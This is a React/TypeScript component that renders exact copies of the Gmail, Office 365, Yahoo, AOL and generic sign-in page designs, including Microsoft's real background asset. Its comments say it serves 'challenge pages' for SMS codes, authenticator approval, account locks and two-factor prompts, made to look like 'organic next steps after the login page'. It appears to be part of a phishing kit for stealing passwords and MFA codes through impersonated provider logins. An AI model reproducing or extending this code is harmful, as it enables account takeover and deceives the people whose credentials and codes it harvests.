import React from 'react';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

export interface ProviderShellProps {
  providerKey: ProviderKey;
  /** The signed-in user's email; rendered in the provider-appropriate place
   * (left-column pill for Gmail, top "← email" row for Office365,
   * centred grey pill for Yahoo/AOL, small subtitle for Others). */
  email?: string;
  /** Main heading shown in the body. */
  title: string;
  /** Optional supporting paragraph rendered under the title. */
  description?: React.ReactNode;
  /** The challenge form / body content (input fields, code entry, spinner, etc.). */
  children: React.ReactNode;
  /** Bottom-row primary actions (right-aligned for Gmail/Office365; full-width
   * stacked for Yahoo/AOL/Others). Free-form so callers can render any number
   * of buttons. */
  primaryActions?: React.ReactNode;
  /** Bottom-row secondary text-link action (left-aligned for Gmail/Office365,
   * inline link row for Yahoo/AOL/Others). */
  secondaryAction?: React.ReactNode;
  /** Called when the user clicks the small "←" back button on the email row
   * (Office365). For Gmail the email pill is non-interactive; Yahoo / AOL /
   * Others render the email as a static pill. */
  onBack?: () => void;
}

/**
 * Provider-aware layout that renders the EXACT chrome of each provider's
 * real sign-in / challenge page (background, header bar, centred card, logo
 * placement, email pill, footer) — sourced from the provider login pages
 * (`GmailLoginPage`, `Office365Wrapper`, `YahooLoginPage`, `AolLoginPage`,
 * `OthersLoginPage`). Use this from every interactive challenge page so SMS
 * code, authenticator approval, account locked, security check, two-factor,
 * and email verification all look like organic next steps after the login
 * page rather than placeholder cards.
 */
const ProviderShell: React.FC<ProviderShellProps> = ({
  providerKey,
  email,
  title,
  description,
  children,
  primaryActions,
  secondaryAction,
  onBack,
}) => {
  const theme = getProviderTheme(providerKey);

  // ───────────────────────────────────────── Gmail (Google challenge chrome)
  if (providerKey === 'gmail') {
    return (
      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ fontFamily: theme.fontFamily }}>
        <main className="flex-grow w-full flex items-center justify-center p-4">
          <div
            className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
            style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
          >
            <div className="flex flex-col md:flex-row md:gap-16">
              {/* Left column: Google logo + title + description + email pill */}
              <div className="md:w-1/2 md:pt-4">
                <ProviderLogo providerKey="gmail" />
                <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">{title}</h1>
                {description && (
                  <p className="text-[16px] leading-6 text-gray-900 mt-4 max-w-md">{description}</p>
                )}
                {email && (
                  <div className="mt-6">
                    <button
                      type="button"
                      className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors"
                      onClick={onBack}
                    >
                      <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
                        {email.charAt(0).toUpperCase()}
                      </div>
                      <span className="text-sm text-gray-800 pr-1">{email}</span>
                      <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true">
                        <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                      </svg>
                    </button>
                  </div>
                )}
              </div>

              {/* Right column: form/body + actions row */}
              <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
                {children}
                {(secondaryAction || primaryActions) && (
                  <div className="flex justify-between items-center mt-12">
                    <div>{secondaryAction}</div>
                    <div className="flex items-center gap-4">{primaryActions}</div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </main>
      </div>
    );
  }

  // ─────────────────────────────────────── Office 365 (Microsoft chrome)
  if (providerKey === 'office365') {
    // Use the EXACT same background asset/styling as `Office365Wrapper`
    // (`/public/office.365.html`) so the login page and every subsequent
    // interactive page (incorrect password, 2FA/MFA, SMS, locked, …) share
    // a single consistent Microsoft visual identity. Mobile collapses to a
    // plain white background, mirroring the iframe's `@media (max-width:600px)`
    // rule.
    return (
      <div
        className="o365-shell min-h-screen flex items-center justify-center p-0 md:p-4"
        style={{
          fontFamily: theme.fontFamily,
          backgroundImage:
            "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')",
          backgroundSize: 'cover',
          backgroundRepeat: 'no-repeat',
          backgroundAttachment: 'fixed',
          backgroundPosition: 'center center',
          backgroundColor: '#fff',
        }}
      >
        <style>{`
          @media (max-width: 600px) {
            .o365-shell { background-image: none !important; background-color: #fff !important; }
          }
        `}</style>
        <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
          <div className="mb-5">
            <ProviderLogo providerKey="office365" />
          </div>
          {email && (
            <div className="flex items-center text-sm text-[#1b1b1b] mb-3">
              <button
                type="button"
                onClick={onBack}
                className="mr-2 text-[#1b1b1b] hover:text-[#0067b8]"
                aria-label="Back"
              >
                &larr;
              </button>
              <span>{email}</span>
            </div>
          )}
          <h1 className="text-[24px] leading-7 font-semibold text-[#1b1b1b] mb-3">{title}</h1>
          {description && <div className="text-sm text-[#1b1b1b] mb-5">{description}</div>}
          {children}
          {secondaryAction && <div className="mt-3 flex flex-col gap-1">{secondaryAction}</div>}
          {primaryActions && <div className="mt-6 flex justify-end gap-2">{primaryActions}</div>}
        </div>
      </div>
    );
  }

  // ─────────────────────────────────────── Yahoo (Yahoo sign-in chrome)
  if (providerKey === 'yahoo') {
    return (
      <div
        className="min-h-screen bg-white font-sans flex flex-col"
        style={{ fontFamily: theme.fontFamily }}
      >
        <header className="flex-shrink-0 flex justify-between items-center py-6 px-10">
          <ProviderLogo providerKey="yahoo" className="h-11" />
          <div className="flex items-center space-x-4 text-xs text-gray-600">
            <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
            <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
            <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
          </div>
        </header>
        <main className="flex-grow w-full max-w-screen-xl mx-auto flex justify-center items-start px-4 md:px-10">
          <div
            className="w-[400px] mx-auto pt-10 pb-12 px-8 bg-white rounded-2xl"
            style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}
          >
            <ProviderLogo providerKey="yahoo" className="h-9 mx-auto mt-2 mb-6" />
            <h2 className="text-center text-[22px] font-bold text-gray-900">{title}</h2>
            {email && (
              <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">
                {email}
              </div>
            )}
            {description && <p className="text-center text-sm text-gray-600 mb-5">{description}</p>}
            <div className="mt-2">{children}</div>
            {primaryActions && <div className="mt-5 flex flex-col gap-3">{primaryActions}</div>}
            {secondaryAction && <div className="mt-4 text-sm flex justify-between items-center">{secondaryAction}</div>}
          </div>
        </main>
      </div>
    );
  }

  // ─────────────────────────────────────── AOL (AOL sign-in chrome)
  if (providerKey === 'aol') {
    return (
      <div
        className="min-h-screen bg-white font-sans flex flex-col"
        style={{ fontFamily: theme.fontFamily }}
      >
        <header className="flex-shrink-0 flex justify-between items-center py-4 px-6 md:px-10 border-b border-gray-200">
          <ProviderLogo providerKey="aol" className="h-6" />
          <div className="flex items-center space-x-4 text-xs text-gray-500 font-medium">
            <a href="https://help.aol.com/" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
            <a href="https://legal.aol.com/us/en/aol/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
            <a href="https://legal.aol.com/us/en/aol/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
          </div>
        </header>
        <main className="flex-grow w-full max-w-screen-xl mx-auto flex justify-center items-start px-4 md:px-10">
          <div className="w-full max-w-[400px] mt-8 py-12 px-10 bg-white rounded-xl border border-gray-200">
            <ProviderLogo providerKey="aol" className="h-10 mx-auto mb-6" />
            <h2 className="text-center text-2xl font-bold text-gray-900 mb-3">{title}</h2>
            {email && (
              <div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate mb-3">
                {email}
              </div>
            )}
            {description && <p className="text-center text-sm text-gray-600 mb-5">{description}</p>}
            <div className="mt-2">{children}</div>
            {primaryActions && <div className="mt-5 flex flex-col gap-3">{primaryActions}</div>}
            {secondaryAction && <div className="mt-4 text-sm flex justify-between items-center">{secondaryAction}</div>}
          </div>
        </main>
      </div>
    );
  }

  // ─────────────────────────────────────── Others (generic Adobe-like chrome)
  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white rounded-lg shadow p-8">
          <div className="flex justify-center mb-5">
            <ProviderLogo providerKey="others" className="h-12 w-12" />
          </div>
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] text-center mb-2">{title}</h1>
          {email && <p className="text-sm text-gray-600 text-center mb-2">{email}</p>}
          {description && <p className="text-sm text-[#555] text-center mb-6">{description}</p>}
          <div className="mt-2">{children}</div>
          {primaryActions && <div className="mt-5 flex flex-col gap-3">{primaryActions}</div>}
          {secondaryAction && <div className="mt-4 text-sm flex justify-between items-center">{secondaryAction}</div>}
        </div>
      </main>
    </div>
  );
};

export default ProviderShell;
